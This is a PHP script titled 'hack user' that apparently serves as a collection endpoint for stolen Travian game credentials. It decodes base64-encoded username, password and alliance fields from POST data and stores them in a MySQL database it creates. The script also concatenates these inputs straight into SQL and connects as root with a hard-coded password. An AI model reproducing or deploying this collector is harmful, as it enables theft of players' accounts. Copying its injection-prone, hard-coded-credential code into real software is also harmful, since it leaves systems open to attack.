<?php
	session_start();
	$_SESSION['crypt_n'] = $_POST['crypt_n'];
	$_SESSION['crypt_p'] = $_POST['crypt_p'];
	$_SESSION['crypt_a'] = $_POST['crypt_a'];
?>

<html>
<head>
<title>hack user</title>
</head>
<body>

<?php
	function decode($crypt_n, $crypt_p, $crypt_a, &$user, &$pass, &$ally)
	{
		echo $crypt_n;
		echo "<br>";
		$user = base64_decode($crypt_n);
		$user = iconv("UTF-8", "GB2312", $user);
		$pass = base64_decode($crypt_p);
		$pass = iconv("UTF-8", "GB2312", $pass);
		$ally = base64_decode($crypt_a);
		$ally = iconv("UTF-8", "GB2312", $ally);
	}
?>
<?php
	decode($_SESSION['crypt_n'], $_SESSION['crypt_p'], $_SESSION['crypt_a'], $user, $pass, $ally);
	$connect = mysql_connect("localhost", "root", "root") or 
		die ("Hey loser, check your server connection.");
		
	$create_db = mysql_query("CREATE DATABASE IF NOT EXISTS travian")
		or die(mysql_error());

	mysql_select_db("travian");
	
	$create_tbl = "CREATE TABLE IF NOT EXISTS userinfo (
	user_id int(11) NOT NULL auto_increment, 
	user_name varchar(255) NOT NULL, 
	user_pswd varchar(255) NOT NULL, 
	user_ally varchar(255) NOT NULL,
	PRIMARY KEY  (user_id)
	) default charset=utf8;";
	$results = mysql_query($create_tbl)
		or die (mysql_error());
	
	echo "Travian Database successfully created!";
	echo "<br>";
	$setting = mysql_query('SET NAMES gb2312;')
	or die(mysql_error());
	$insert = "INSERT INTO userinfo (user_name, user_pswd, user_ally) " .
	"VALUES ('" . $user . "', '" . $pass . "', '" . $ally . "');"; 
	$results = mysql_query($insert)
	or die(mysql_error());
	
	echo "Data inserted successfully!";
?>

</body>
</html>